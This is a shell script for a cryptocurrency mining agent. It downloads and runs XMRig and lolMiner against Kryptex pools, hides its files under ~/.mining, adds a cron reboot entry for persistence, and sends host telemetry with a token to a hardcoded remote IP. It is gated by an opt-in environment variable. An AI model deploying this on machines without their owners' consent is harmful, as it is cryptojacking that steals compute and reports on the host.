#!/bin/sh
set -u

#################################################
# MINING AGENT — CPU + GPU + GPU HASHRATE
#################################################

[ "${ALLOW_MINING:-0}" = "1" ] || exit 0

# ===== PANEL =====
PANEL="http://178.47.141.130:3333"
TOKEN="mamont22187"
INTERVAL=30
HOST="$(hostname)"

# ===== ACCOUNTS =====
KRIPTEX="krxX3PVQVR"

# ===== POOLS =====
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"

# ===== PATHS =====
BASE="$HOME/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"

mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG" >/dev/null 2>&1

#################################################
# UTILS
#################################################

json_escape() { echo "$1" | sed 's/"/\\"/g'; }

post() {
  curl -s "$1" \
    -H "Content-Type: application/json" \
    -H "token: $TOKEN" \
    -d "$2" >/dev/null 2>&1
}

#################################################
# INSTALL
#################################################

install_xmrig() {
  [ -x "$BIN/cpu/xmrig" ] && return
  wget -q https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz -O /tmp/xmr.tgz || return
  tar -xzf /tmp/xmr.tgz -C "$BIN/cpu" --strip-components=1
  chmod +x "$BIN/cpu/xmrig"
}

install_lolminer() {
  [ -x "$BIN/gpu/lolMiner" ] && return
  wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz -O /tmp/lol.tgz || return
  tar -xzf /tmp/lol.tgz -C "$BIN/gpu" --strip-components=1
  chmod +x "$BIN/gpu/lolMiner"
}

#################################################
# CPU (xmrig)
#################################################

start_cpu() {
  stop_cpu
  nohup "$BIN/cpu/xmrig" \
    -o "$XMR_POOL" \
    -u "$KRIPTEX.$HOST" -p x \
    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
    >> "$LOG/cpu.log" 2>&1 &
  echo $! > "$RUN/cpu.pid"
}

stop_cpu() {
  [ -f "$RUN/cpu.pid" ] && kill "$(cat "$RUN/cpu.pid")" 2>/dev/null || true
  rm -f "$RUN/cpu.pid"
}

#################################################
# GPU (lolMiner) + API
#################################################

start_gpu() {
  stop_gpu
  nohup "$BIN/gpu/lolMiner" \
    --algo ETCHASH \
    --pool "$ETC_POOL" \
    --user "$KRIPTEX.$HOST" \
    --apihost 127.0.0.1 \
    --apiport 8080 \
    >> "$LOG/gpu.log" 2>&1 &
  echo $! > "$RUN/gpu.pid"
}

stop_gpu() {
  [ -f "$RUN/gpu.pid" ] && kill "$(cat "$RUN/gpu.pid")" 2>/dev/null || true
  rm -f "$RUN/gpu.pid"
}

#################################################
# HASHRATES
#################################################

# CPU H/s
get_cpu_hashrate() {
  curl -s --max-time 2 http://127.0.0.1:16000/1/summary \
    | grep -oE '"total":\[[^]]+' \
    | grep -oE '[0-9]+(\.[0-9]+)?' \
    | head -1 || echo 0
}

# GPU MH/s → H/s
get_gpu_hashrate() {
  curl -s --max-time 2 http://127.0.0.1:8080/summary \
    | grep -oE '"Performance":[ ]*[0-9]+(\.[0-9]+)?' \
    | grep -oE '[0-9]+(\.[0-9]+)?' \
    | awk '{ printf "%.0f", $1 * 1000000 }' || echo 0
}

#################################################
# METRICS
#################################################

get_cpu_temp() {
  sensors 2>/dev/null | awk '/Package id 0:|Tctl:/ {gsub(/[+°C]/,"",$NF); print int($NF)}' | head -1
}

get_gpu_temp() {
  nvidia-smi --query-gpu=temperature.gpu --format=csv,noheader 2>/dev/null | head -1
}

get_uptime() { uptime -p 2>/dev/null; }
get_load() { uptime | awk -F'load average:' '{print $2}' | cut -d',' -f1 | xargs; }
gpu_detected() { lspci | grep -qiE "nvidia|amd" && echo true || echo false; }

#################################################
# TELEMETRY
#################################################

send_telemetry() {
  CPU_HR=$(get_cpu_hashrate)
  GPU_HR=$(get_gpu_hashrate)
  TOTAL_HR=$((CPU_HR + GPU_HR))

  post "$PANEL/api/telemetry" "{
    \"hostname\": \"$HOST\",
    \"cpu_mining\": \"$([ -f "$RUN/cpu.pid" ] && echo running || echo stopped)\",
    \"gpu_mining\": \"$([ -f "$RUN/gpu.pid" ] && echo running || echo stopped)\",
    \"gpu_detected\": $(gpu_detected),
    \"hashrate\": $TOTAL_HR,
    \"cpu_temp\": $(get_cpu_temp || echo null),
    \"gpu_temp\": $(get_gpu_temp || echo null),
    \"uptime\": \"$(json_escape "$(get_uptime)")\",
    \"load\": $(get_load || echo null)
  }"
}

#################################################
# AUTOSTART
#################################################

ensure_autostart() {
  crontab -l 2>/dev/null | grep -q "ALLOW_MINING=1 $BASE/min.sh" && return
  (crontab -l 2>/dev/null; echo "@reboot ALLOW_MINING=1 $BASE/min.sh") | crontab -
}

#################################################
# AGENT LOOP
#################################################

agent() {
  ensure_autostart
  install_xmrig
  install_lolminer
  start_cpu
  start_gpu

  while true; do
    [ -f "$RUN/cpu.pid" ] || start_cpu
    [ -f "$RUN/gpu.pid" ] || start_gpu
    send_telemetry
    sleep "$INTERVAL"
  done
}

#################################################
# MAIN
#################################################

agent
